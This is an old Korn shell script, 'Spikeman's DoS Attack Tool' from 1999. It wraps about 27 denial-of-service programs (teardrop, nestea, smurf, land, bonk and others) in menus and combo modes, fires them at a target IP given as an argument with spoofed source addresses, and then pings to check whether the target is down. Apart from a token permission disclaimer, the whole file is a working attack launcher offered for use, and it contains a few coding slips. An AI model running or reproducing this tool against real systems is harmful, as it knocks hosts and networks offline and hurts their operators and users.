#!/bin/ksh
#######################################################################
# Spikeman's DoS Attack Tool - Revision 4             Sat Jun 12 1999 #
#                                                                     #
# If you would like to experiment with this file, make sure you do    #
# It to a system which you have permission to experiment on, ahead    #
# Of time..  I cannot and will not be held responsible nor legally    #
# Bound for The malicious activities of individuals who come into     #
# Possession of This Script.                                          #
#                                                                     #
# To use this script you will need to compile sources given in this   #
# zip file. Enjoy.. Comments, Questions and or ideas can be sent to   #
# spikeman@myself.com                                                 #
#                                                                     #
#                                                                     #
# Spikeman                                                            #
# spikeman@myself.com                http://spikeman.genocide2600.com #
#######################################################################
#
# Revision 1
# Fixed The Sleep Delay , Smurf , The dev/null problem.
# New Attacks coming soon....
########
# Revision 2
# New attacks added . 1234 , beer , coke , dcd3c , gewse3
# pong , spiffit , udpdata . Menu Changes , cleanup added
########
# Revision 3
# New attacks added . Conseal Firewall , fawx , gewse,
# kkill , Orgasm and Wingate crash.  Pick Attack Menu Change.
# Nestea problem fixed.
########
# Revision 4
# Seems that RedHat 5.2 Running KSH v5.2.12 was having problems
# with my coding. so I fixed up the code, Thanks to LoTuS for the Error.
# Also while looking over the code I fixed the ping online problem.
#
SOURCE=225.225.225.225
SOURCE2=172.16.2.18
SOURCE3=135.66.66.66
SOURCE4=10.10.10.10
SOURCE5=135.66.66.66
SOURCE6=10.10.10.10
SOURCE7=132.222.123.12
SOURCE8=140.103.23.123
SOURCE9=207.69.43.66
SOURCE10=10.10.10.10
SOURCE11=199.188.87.44
SOURCE12=179.132.43.23
ATTACKIP=$1
REV=4
cleanup(){
killall -9 teardrop > /dev/null 2> /dev/null
killall -9 nestea > /dev/null 2> /dev/null
killall -9 syndrop > /dev/null 2> /dev/null
killall -9 newtear > /dev/null 2> /dev/null
killall -9 bonk > /dev/null 2> /dev/null
killall -9 smurf > /dev/null 2> /dev/null
killall -9 boink > /dev/null 2> /dev/null
killall -9 jolt > /dev/null 2> /dev/null
killall -9 sping > /dev/null 2> /dev/null
killall -9 land > /dev/null 2> /dev/null
killall -9 latierra > /dev/null 2> /dev/null
killall -9 pepsi > /dev/null 2> /dev/null
killall -9 1234 > /dev/null 2> /dev/null
killall -9 beer > /dev/null 2> /dev/null
killall -9 coke > /dev/null 2> /dev/null
killall -9 dcd3c > /dev/null 2> /dev/null
killall -9 gewse3 > /dev/null 2> /dev/null
killall -9 pong > /dev/null 2> /dev/null
killall -9 spiffit > /dev/null 2> /dev/null
killall -9 udpdata > /dev/null 2> /dev/null
killall -9 'ping -s63200' > /dev/null 2> /dev/null
killall -9 conseal > /dev/null 2> /dev/null
killall -9 fawx > /dev/null 2> /dev/null
killall -9 gewse > /dev/null 2> /dev/null
killall -9 kkill > /dev/null 2> /dev/null
killall -9 orgasm > /dev/null 2> /dev/null
killall -9 wingatecrash > /dev/null 2> /dev/null
}
exitout(){
cleanup
echo "Exiting Program...."
exit
}
null(){
echo "Spikemans DoS Attack Tool      Revision $REV"
echo "This Script is Given Out Without Warranty"
echo "Scripted by Spikeman  spikeman@myself.com"
echo ""
echo "Usage ./spike.sh ip/host"
}
teard(){
echo "Teadroping....."
teardrop $SOURCE $ATTACKIP -n 100 > /dev/null 2> /dev/null
echo "Completed...."
}
ntea(){
echo "Nesteaing....."
nestea $SOURCE2 $ATTACKIP 139 139 500 > /dev/null 2> /dev/null
nestea $SOURCE3 $ATTACKIP 139 80 500 > /dev/null 2> /dev/null
echo "Completed...."
}
sdrop(){
echo "Syndroping....."
syndrop $SOURCE4 $ATTACKIP 139 139 500 > /dev/null 2> /dev/null
syndrop $SOURCE5 $ATTACKIP 139 90 500 > /dev/null 2> /dev/null
echo "Completed...."
}
ntear(){
echo "NewTearing....."
newtear $SOURCE6 $ATTACKIP -n 300 > /dev/null 2> /dev/null
echo "Completed...."
}
bk(){
echo "Bonking....."
bonk 119.168.83.42 $ATTACKIP 5000 0 1330 > /dev/null 2> /dev/null
echo "Completed...."
}
smrf(){
echo "Smurfing...."
smurf 129.183.83.42 $ATTACKIP 5000 0 1330 > /dev/null 2> /dev/null
echo "Completed...."
}
bandback(){
echo "Attacking On Hold For BandWidth"
sleep 12s > /dev/null 2> /dev/null
echo "Completed...."
}
bink(){
echo "Boinking....."
boink 159.184.87.43 $ATTACKIP 1 500 3 > /dev/null 2> /dev/null
echo "Completed...."
}
jlt(){
echo "Jolting....."
jolt $ATTACKIP $SOURCE 3 > /dev/null 2> /dev/null
echo "Completed...."
}
spng(){
echo "Spinging....."
sping $ATTACKIP > /dev/null 2> /dev/null
sping $ATTACKIP > /dev/null 2> /dev/null
sping $ATTACKIP > /dev/null 2> /dev/null
sping $ATTACKIP > /dev/null 2> /dev/null
sping $ATTACKIP > /dev/null 2> /dev/null
sping $ATTACKIP > /dev/null 2> /dev/null
echo "Completed...."
}
pingfd(){
echo "Ping Flooding....."
ping -s63200 -c30 $ATTACKIP > /dev/null 2> /dev/null
echo "Completed...."
}
lnd(){
echo "Landing....."
land $ATTACKIP 113 > /dev/null 2> /dev/null
land $ATTACKIP 139 > /dev/null 2> /dev/null
land $ATTACKIP 135 > /dev/null 2> /dev/null
echo "Completed...."
}
latrra(){
echo "Latierraing....."
latierra -b 1 -e 1000 -s 0 -l 5 -i $ATTACKIP > /dev/null 2> /dev/null
echo "Completed...."
}
ppsi(){
echo "Pepsing....."
pepsi -s 127.0.0.1 -n 100 $ATTACKIP > /dev/null 2> /dev/null
echo "Completed...."
}
numba(){
echo "1234ing....."
1234 $SOURCE9 $ATTACKIP 50 > /dev/null 2> /dev/null
echo "Completed...."
}
be3r(){
echo "Beering....."
beer $ATTACKIP 5 > /dev/null 2> /dev/null
echo "Completed...."
}
c0ke(){
echo "Coking....."
coke $ATTACKIP 500 > /dev/null 2> /dev/null
echo "Completed...."
}
dcde(){
echo "dcd3cing....."
dcd3c $1 > /dev/null 2> /dev/null
echo "Completed...."
}
gews3(){
echo "gewse5ing....."
gewse5 $ATTACKIP 4 > /dev/null 2> /dev/null
echo "Completed...."
}
p0ng(){
echo "Ponging....."
pong -fV -c 50 -i 1 -s 1400 $ATTACKIP $SOURCE10 > /dev/null 2> /dev/null
echo "Completed...."
}
spffit(){
echo "Spiffiting....."
spiffit $SOURCE11 139 $ATTACKIP root 500 > /dev/null 2> /dev/null
echo "Completed...."
}
udpdat(){
echo "UDPdataing....."
udpdata $SOURCE7 139 $ATTACKIP 139 > /dev/null 2> /dev/null
echo "Completed...."
}
cseal(){
echo "Conseal Firewall Attacking....."
conseal $ATTACKIP 10000 > /dev/null 2> /dev/null
echo "Completed...."
}
f4wx(){
echo "Fawxing....."
fawx $SOURCE12 $ATTACKIP 5000 > /dev/null 2> /dev/null
echo "Completed...."
}
g3wse(){
echo "Gewseing....."
gewse $ATTACKIP 2000 > /dev/null 2> /dev/null
echo "Completed...."
}
kkll(){
echo "KKilling....."
kkill $ATTACKIP 113 > /dev/null 2> /dev/null
kkill $ATTACKIP 139 > /dev/null 2> /dev/null
kkill $ATTACKIP 135 > /dev/null 2> /dev/null
echo "Completed...."
}
ogasm(){
echo "Orgasming....."
orgasm $ATTACKIP 100 500 5 > /dev/null 2> /dev/null
echo "Completed...."
}
wingcrash(){
echo "Wingate crashing....."
wingatecrash $ATTACKIP > /dev/null 2> /dev/null
echo "Completed...."
}
pingonline(){
echo "Pinging to see if still online"
ping -c10 $ATTACKIP
echo "Completed...."
echo "If you get a reply they are still online"
echo "If not they are off or very laged.."
}
lightattack(){
teard
ntea
sdrop
ntear
bk
f4wx
smrf
lnd
numba
pingonline
}
medattack(){
teard
ntea
sdrop
cseal
ntear
bk
smrf
jlt
spng
kkll
pingfd
lnd
wingcrash
numba
be3r
udpdat
pingonline
}
hardattack(){
teard
ntea
sdrop
ntear
bk
f4wx
smrf
bandback
bink
cseal
jlt
spng
wingcrash
pingfd
lnd
latrra
ppsi
bandback
numba
be3r
c0ke
dcde
gews3
p0ng
spffit
udpdat
ogasm
g3wse
kkll
pingonline
}
pickattack(){
clear
echo "1] Teardrop  2] Nestea     3] Syndrop  4] Newtear"
echo "5] Bonk      6] Smurf      7] Boink    8] Jolt"
echo "9] Spring   10] Pingflood 11] Land    12] Latierra"
echo "13] Pepsi   14] 1234      15] Beer    16] Coke"
echo "17] Dcd3c   18] Gewse3    19] Pong    20] Spiffit"
echo "21] UDPdata 22] Conseal   23] Fawx    24] Gewse"
echo "25] KKill   26] Orgasm    27] Wingate crash"
echo "28] To Exit"
echo ""
echo "Enter The Number Of The Attack To Run"
read ATTACKS
case "$ATTACKS" in
  1)
    teard
	exitout
    ;;
  2)
    ntea
	exitout
    ;;
  3)
    sdrop
	exitout
    ;;
  4)
    ntear
	exitout
    ;;
  5)
    bk
	exitout
    ;;
  6)
    smrf
	exitout
    ;;
  7)
    bink
	exitout
    ;;
  8)
    jlt
	exitout
    ;;
  9)
    spng
	exitout
    ;;
  10)
    pingfd
	exitout
    ;;
  11)
    lnd
	exitout
    ;;
  12)
    latrra
	exitout
    ;;
  13)
    ppsi
	exitout
    ;;
  14)
    numba
	exitout
    ;;
  15)
    be3r
	exitout
    ;;
  16)
    c0ke
	exitout
    ;;
  17)
    dcdc
	exitout
    ;;
  18)
    gews3
	exitout
    ;;
  19)
    p0ng
	exitout
    ;;
  20)
    spffit
	exitout
    ;;
  21)
    udpdat
	exitout
    ;;
  22)
    cseal
	exitout
    ;;
  23)
    f4wx
	exitout
    ;;
  24)
    g3wse
	exitout
    ;;
  25)
    kkll
	exitout
    ;;
  26)
    ogasm
	exitout
    ;;
  27)
	wingcrash
	exitout
    ;;
  28)
	exitout
    ;;
  *)
    echo "ERROR, $ATTACK is not on the list."
	sleep 3s
    pickattack
    ;;
esac
}
comboattacks(){
echo "Type 1 Light Combo Attack On $ATTACKIP"
echo "Type 2 Medium Combo Attack On $ATTACKIP"
echo "Type 3 Hard Combo Attack On $ATTACKIP"
echo "Type 4 To Exit Out"
read PICKTWO
case "$PICKTWO" in
  1)
	lightattack
	exitout
    ;;
  2)
    medattack
	exitout
    ;;
  3)
    hardattack
	exitout
    ;;
  4)
	exitout
    ;;
  *)
    echo "ERROR, $ATTACK is not on the list."
	sleep 3s
    PICKTWO
    ;;
esac
}
if [ $# != 1 ]
then
null
exit
else
echo "Type 1 for Combo Attacks"
echo "Type 2 for Pick The Attack"
echo "Type 3 To Run Clean up (Kill Hung Attacks)"
echo "Type 4 To Exit Out"
read PICKONE
if test $PICKONE
then
if test $PICKONE = 1
then
comboattacks
exitout
elif test $PICKONE = 2
then
pickattack
exitout
elif test $PICKONE = 3
then
cleanup
exitout
elif test $PICKONE = 4
then
exitout
fi
fi
fi
fi